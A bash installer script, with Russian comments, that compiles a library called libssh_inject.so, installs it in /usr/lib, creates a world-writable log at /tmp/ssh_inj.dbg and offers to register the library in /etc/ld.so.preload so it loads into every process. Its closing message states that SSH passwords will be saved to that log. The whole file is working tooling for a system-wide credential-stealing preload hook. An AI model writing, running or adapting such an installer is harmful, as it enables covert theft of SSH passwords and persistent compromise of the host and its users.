#!/bin/bash

# Установщик для libssh_inject.so
# Этот скрипт устанавливает библиотеку в систему и настраивает её автоматическую загрузку

# Проверка root прав
if [ "$EUID" -ne 0 ]; then
  echo "Для установки библиотеки требуются права администратора."
  echo "Запустите скрипт с sudo: sudo ./installer.sh"
  exit 1
fi

# Функция для очистки и выхода при ошибке
cleanup_and_exit() {
  echo "Произошла ошибка. Установка прервана."
  exit 1
}

# Проверка наличия исходных файлов
if [ ! -f state.hpp ] || [ ! -f ssh_inject.cpp ]; then
  echo "Не найдены исходные файлы state.hpp и/или ssh_inject.cpp."
  echo "Убедитесь, что вы запускаете скрипт из директории с исходными файлами."
  exit 1
fi

# Создание временной директории для сборки
echo "Создание временной директории для сборки..."
BUILD_DIR=$(mktemp -d)
cp state.hpp "$BUILD_DIR/"
cp ssh_inject.cpp "$BUILD_DIR/"
cd "$BUILD_DIR" || cleanup_and_exit

# Компиляция библиотеки
echo "Компиляция libssh_inject.so..."
mkdir -p src/ssh_inject
cp state.hpp src/ssh_inject/
cp ssh_inject.cpp src/ssh_inject/
g++ -shared -fPIC -o libssh_inject.so src/ssh_inject/ssh_inject.cpp -ldl

if [ $? -ne 0 ]; then
  echo "Ошибка компиляции! Проверьте наличие компилятора g++ и библиотеки libdl."
  cleanup_and_exit
fi

# Проверка компиляции
if [ ! -f libssh_inject.so ]; then
  echo "Ошибка: файл libssh_inject.so не найден после компиляции."
  cleanup_and_exit
fi

echo "Библиотека успешно скомпилирована."

# Копирование библиотеки в системную директорию
echo "Установка библиотеки в систему..."
INSTALL_DIR="/usr/lib"
cp libssh_inject.so "$INSTALL_DIR/"
chmod 755 "$INSTALL_DIR/libssh_inject.so"

if [ ! -f "$INSTALL_DIR/libssh_inject.so" ]; then
  echo "Ошибка: не удалось скопировать библиотеку в $INSTALL_DIR."
  cleanup_and_exit
fi

# Создание лог-файла
touch /tmp/ssh_inj.dbg
chmod 666 /tmp/ssh_inj.dbg

# Настройка автозагрузки через ld.so.preload
echo "Настройка автозагрузки библиотеки..."
echo -n "Вы хотите настроить автоматическую загрузку библиотеки через /etc/ld.so.preload? [y/N]: "
read auto_load

if [[ "$auto_load" =~ ^[Yy]$ ]]; then
  # Создаем резервную копию текущего ld.so.preload
  if [ -f /etc/ld.so.preload ]; then
    cp /etc/ld.so.preload /etc/ld.so.preload.bak
    echo "Создана резервная копия /etc/ld.so.preload.bak"
  fi
  
  # Проверяем, есть ли уже наша библиотека в ld.so.preload
  if [ -f /etc/ld.so.preload ] && grep -q "$INSTALL_DIR/libssh_inject.so" /etc/ld.so.preload; then
    echo "Библиотека уже прописана в /etc/ld.so.preload"
  else
    echo "$INSTALL_DIR/libssh_inject.so" >> /etc/ld.so.preload
    echo "Библиотека добавлена в /etc/ld.so.preload"
  fi
  
  echo ""
  echo "ВНИМАНИЕ: Библиотека будет автоматически загружаться для всех процессов SSH."
  echo "Если возникнут проблемы, удалите библиотеку из /etc/ld.so.preload."
else
  echo ""
  echo "Вы выбрали ручную загрузку библиотеки."
  echo "Для использования выполните команду:"
  echo "LD_PRELOAD=$INSTALL_DIR/libssh_inject.so ssh user@server"
fi

# Очистка
echo "Очистка временных файлов..."
cd - > /dev/null || cleanup_and_exit
rm -rf "$BUILD_DIR"

echo ""
echo "Установка завершена успешно!"
echo "Пароли будут сохраняться в файл: /tmp/ssh_inj.dbg" 